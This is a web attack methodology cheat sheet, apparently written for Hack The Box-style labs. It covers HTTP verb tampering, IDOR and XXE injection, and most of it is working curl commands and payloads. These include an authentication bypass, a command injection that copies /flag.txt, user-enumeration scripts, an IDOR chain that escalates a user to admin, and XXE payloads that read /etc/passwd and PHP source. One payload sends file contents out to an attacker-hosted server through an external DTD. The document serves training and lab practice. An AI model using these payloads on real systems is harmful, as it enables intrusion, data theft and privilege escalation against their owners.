# Web Attacks Methodology

**Three attack families:** HTTP Verb Tampering, IDOR, XXE Injection

**Core principle:** Enumerate what the server accepts, find what it doesn't properly restrict, exploit the gap.

---

## HTTP Verb Tampering

### When to use
- Any page that restricts access with HTTP Basic Auth
- Any form that applies a security filter (SQLi, XSS, CMDi sanitization)
- Any endpoint that behaves differently for different HTTP methods

### Root Cause — Two Types

| Type | Cause | Example |
|------|-------|---------|
| Insecure Config | `<Limit GET POST>` only covers listed verbs | Auth bypass via HEAD/DELETE/PUT |
| Insecure Coding | Filter checks `$_POST` but execution uses `$_REQUEST` | CMDi filter bypass via GET |

### Attack 1 — Auth Bypass (Insecure Config)

```bash
# Step 1: Check what methods the server accepts
curl -i -X OPTIONS http://<TARGET>/admin/reset.php

# Step 2: Try each method (HEAD first, then others)
curl -i -X HEAD http://<TARGET>/admin/reset.php
curl -i -X DELETE http://<TARGET>/admin/reset.php
curl -i -X PUT http://<TARGET>/admin/reset.php
curl -i -X PATCH http://<TARGET>/admin/reset.php

# 200 OK without auth prompt = bypass successful
# Then check if the action executed
curl -s http://<TARGET>/
```

**Key:** Try ALL verbs — `%0a` (HEAD) may still be covered. `DELETE`, `PATCH`, `PUT` are often missed.

### Attack 2 — Filter Bypass (Insecure Coding)

When: a form blocks special characters but executes the command anyway.

```bash
# Original GET request is blocked — switch to POST
curl -s -X POST http://<TARGET>/index.php \
  --data-urlencode "filename=file; cp /flag.txt ./"

# Or vice versa — if POST is filtered, switch to GET
curl -s "http://<TARGET>/index.php?filename=file;%20cp%20/flag.txt%20./"
```

**Root cause pattern:** `preg_match` uses `$_POST['param']` but `system()` uses `$_REQUEST['param']` — GET bypasses the filter entirely.

### Decision Flow

```
Target has auth-restricted page?
  └─ Try OPTIONS → see allowed verbs
  └─ Try HEAD, DELETE, PUT, PATCH one by one
  └─ 200 OK without login = bypass

Target has a filter blocking payloads?
  └─ Check JS source: is form GET or POST?
  └─ Switch to the OTHER method
  └─ Send malicious payload via the unfiltered method
```

---

## IDOR (Insecure Direct Object References)

### When to use
- Any URL param with an ID: `?uid=1`, `?file_id=123`, `?contract=abc`
- Any API endpoint with a resource identifier: `/api/profile/1`
- Any file download endpoint: `download.php?file=...`
- Any AJAX call in JS source that references user-specific data

### Two Impact Types

| Type | What it gives | Example |
|------|--------------|---------|
| Information Disclosure | Read other users' data | GET other uid's profile, documents |
| Insecure Function Calls | Modify/delete data, escalate privileges | PUT another user's profile with their leaked uuid |

### Step 1 — Identify the Reference

```bash
# Check JS source for how requests are made
curl -s http://<TARGET>/ | grep -i "ajax\|redirect\|fetch\|uid\|id\|contract"

# Check if endpoint uses GET or POST
# $.redirect → POST    |    window.location → GET    |    $.ajax → check type:
```

**Critical:** Always read the JS source before assuming GET. `$.redirect()` sends POST. `window.location` = GET.

### Step 2 — Test the Reference Type

| Reference looks like | What it probably is | How to exploit |
|---------------------|--------------------|-|
| `?uid=1` | Sequential int | Increment/brute-force |
| `?file=MQ==` | Base64 | Decode → change → re-encode |
| `?contract=cdd96d...` | Hash | Find hash function in JS source, recalculate |
| `/api/profile/1` | REST path | Change path number |

### Step 3 — Mass Enumeration

```bash
# Always write to a script file to avoid line-wrap issues
# Documents via POST
cat > /tmp/enum.sh << 'EOF'
#!/bin/bash
url="http://<TARGET>"
for i in {1..20}; do
    for link in $(curl -s -X POST "$url/documents.php" -d "uid=$i" | grep -oP "\/documents.*?\.(pdf|txt)"); do
        echo "uid=$i: $link"
        curl -s "$url$link"
    done
done
EOF
bash /tmp/enum.sh

# Contracts via GET with base64 encoding (= signs need URL encoding)
for i in {1..20}; do
    b64=$(echo -n $i | base64 -w 0)
    content=$(curl -s -G --data-urlencode "contract=$b64" "http://<TARGET>/download.php" | strings)
    echo "$content" | grep -q "HTB{" && echo "uid=$i: $(echo "$content" | grep "HTB{")"
done
```

**Key:** Use `-G --data-urlencode` for base64 values — handles `=` URL-encoding automatically.

### Step 4 — IDOR in APIs (Chained Attack)

```bash
# 1. Information Disclosure — GET any user's profile (no access control)
curl -s "http://<TARGET>/profile/api.php/profile/<uid>"
# Returns: uid, uuid, role, full_name, email, about

# 2. Use leaked uuid to modify another user
curl -s -X PUT "http://<TARGET>/profile/api.php/profile/<uid>" \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"uid":"<uid>","uuid":"<leaked_uuid>","role":"<role>","full_name":"X","email":"attacker@x.com","about":"X"}'

# 3. Enumerate all users to find admin role
for i in {1..20}; do
    curl -s "http://<TARGET>/profile/api.php/profile/$i"
    echo
done

# 4. Escalate own role using discovered admin role name
curl -s -X PUT "http://<TARGET>/profile/api.php/profile/<OWN_uid>" \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"uid":"<OWN_uid>","uuid":"<OWN_uuid>","role":"web_admin","full_name":"X","email":"x@x.com","about":"X"}'
```

**Chaining pattern:** GET (info disclosure, leaks uuid) → PUT (insecure function call, uses leaked uuid) → escalate role → perform admin actions.

### Common Pitfalls

| Problem | Fix |
|---------|-----|
| GET returns empty documents | App uses POST — check JS source for `$.redirect` |
| Base64 `=` signs breaking URL | Use `-G --data-urlencode` |
| `uid mismatch` on PUT | JSON uid must match URL path uid; check for malformed JSON (line breaks) |
| `uuid mismatch` on PUT | Leaked uuid wrong — re-GET the target user's profile |
| Script breaks on paste | Write to file with `cat > /tmp/script.sh << 'EOF'` then `bash /tmp/script.sh` |

---

## XXE (XML External Entity) Injection

### When to use
- Any form that submits data in XML format (check Content-Type: application/xml)
- File upload forms accepting SVG, DOCX, XLSX, PDF (XML-based formats)
- SOAP API endpoints
- JSON APIs (try changing Content-Type to application/xml — sometimes accepted)

### Step 1 — Identify Reflected Field

Send a test entity and look for it in the response:

```bash
curl -s -X POST http://<TARGET>/submitDetails.php \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe "TESTVALUE">]><root><name>x</name><tel>x</tel><email>&xxe;</email><message>x</message></root>'
# If response contains "TESTVALUE" → entity injection confirmed, email field is reflected
```

### Attack 1 — Basic File Read (text files, /etc/passwd)

```bash
curl -s -X POST http://<TARGET>/submitDetails.php \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE email [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><name>x</name><tel>x</tel><email>&xxe;</email><message>x</message></root>'
```

**Use when:** Output is reflected AND file contains no XML special chars (`<`, `>`, `&`).

### Attack 2 — PHP Source Code Read (php://filter)

```bash
curl -s -X POST http://<TARGET>/submitDetails.php \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE email [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=connection.php">]><root><name>x</name><tel>x</tel><email>&xxe;</email><message>x</message></root>'

# Decode the base64 in response
echo "<BASE64_FROM_RESPONSE>" | base64 -d
```

**Use when:** Output is reflected AND file is PHP (contains `<?php` which breaks XML). Base64 wrapping prevents XML parse errors.

### Attack 3 — CDATA Method (any file, output reflected, attacker server available)

```bash
# Step 1: Write DTD file
nano /tmp/xxe.dtd
# Content:
# <!ENTITY joined "%begin;%file;%end;">

# Step 2: Start server
cd /tmp && python3 -m http.server 8000 &

# Step 3: Send payload
curl -s -X POST http://<TARGET>/submitDetails.php \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE email [<!ENTITY % begin "<![CDATA["><!ENTITY % file SYSTEM "file:///var/www/html/target.php"><!ENTITY % end "]]>"><!ENTITY % xxe SYSTEM "http://<OUR_IP>:8000/xxe.dtd">%xxe;]><root><name>x</name><tel>x</tel><email>&joined;</email><message>x</message></root>'
```

**Use when:** Output reflected, file has XML special chars, PHP filter not available (non-PHP app).

**Why external DTD:** XML prevents joining internal+external entities. External DTD allows `%begin;%file;%end;` to be joined.

### Attack 4 — Error-Based XXE (errors shown, no output)

```bash
# Step 1: Write DTD
nano /tmp/xxe.dtd
# Content:
# <!ENTITY % file SYSTEM "file:///etc/passwd">
# <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">

# Step 2: Host it
cd /tmp && python3 -m http.server 8000 &

# Step 3: Send payload
curl -s -X POST http://<TARGET>/error/submitDetails.php \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE email [<!ENTITY % remote SYSTEM "http://<OUR_IP>:8000/xxe.dtd">%remote;%error;]><root></root>'
# File content appears in PHP error message
```

**Use when:** No output reflection but PHP errors are shown. `%nonExistingEntity;` causes error that includes `%file;` content.

### Attack 5 — Blind OOB Exfiltration (no output, no errors)

```bash
# Step 1: Write PHP listener
nano /tmp/index.php
# Content:
# <?php
# if(isset($_GET['content'])){
#     error_log("\n\n" . base64_decode($_GET['content']));
# }
# ?>

# Step 2: Write DTD
nano /tmp/xxe.dtd
# Content:
# <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/path/to/file.php">
# <!ENTITY % oob "<!ENTITY content SYSTEM 'http://<OUR_IP>:8000/?content=%file;'>">

# Step 3: Start PHP server
cd /tmp && php -S 0.0.0.0:8000 &

# Step 4: Send payload
curl -s -X POST http://<TARGET>/blind/submitDetails.php \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE email [<!ENTITY % remote SYSTEM "http://<OUR_IP>:8000/xxe.dtd">%remote;%oob;]><root>&content;</root>'

# Step 5: Check PHP server log
# Base64 content arrives as GET /?content=<BASE64>
# PHP listener decodes it and writes to error log
# Or just copy the base64 from server output and decode manually:
echo "<BASE64>" | base64 -d
```

**Use when:** Completely blind — no output, no errors. Data exfiltrated via HTTP GET to attacker server.

### XXE Method Selection

```
Output reflected in response?
  └─ Yes → Does file contain XML special chars?
       └─ No (plain text/binary)  → Basic file read: file:///path
       └─ Yes (PHP source code)   → php://filter/convert.base64-encode
       └─ Unknown/non-PHP app     → CDATA method (needs attacker server)
  └─ No → Are PHP errors displayed?
       └─ Yes → Error-based XXE (needs attacker server)
       └─ No  → Blind OOB exfiltration (needs attacker server + PHP listener)
```

### Key Commands Reference

```bash
# Read /etc/passwd
file:///etc/passwd

# Read PHP file (base64)
php://filter/convert.base64-encode/resource=index.php

# Read file by absolute path
php://filter/convert.base64-encode/resource=/var/www/html/config.php

# Find web root from server config
file:///etc/nginx/sites-enabled/default
file:///etc/apache2/apache2.conf

# Decode base64 response
echo "<BASE64>" | base64 -d

# Start attacker server (Python - for CDATA/error methods)
cd /tmp && python3 -m http.server 8000 &

# Start attacker server (PHP - for OOB, auto-decodes base64)
cd /tmp && php -S 0.0.0.0:8000 &

# Kill background server
kill %1
```

### Common Pitfalls

| Problem | Fix |
|---------|-----|
| Basic XXE returns nothing for PHP files | Use php://filter/convert.base64-encode |
| CDATA method fails | XML prevents joining internal+external entities — must use external DTD |
| `!` in DTD content breaks bash command | Write DTD via nano, not command line |
| Blind OOB — server not receiving request | Confirm attacker IP is reachable from target; check firewall |
| base64 has line breaks | Use `echo -n` or `tr -d '\n'` before decoding |
| DTD file not found | Confirm server is running and file path is correct |
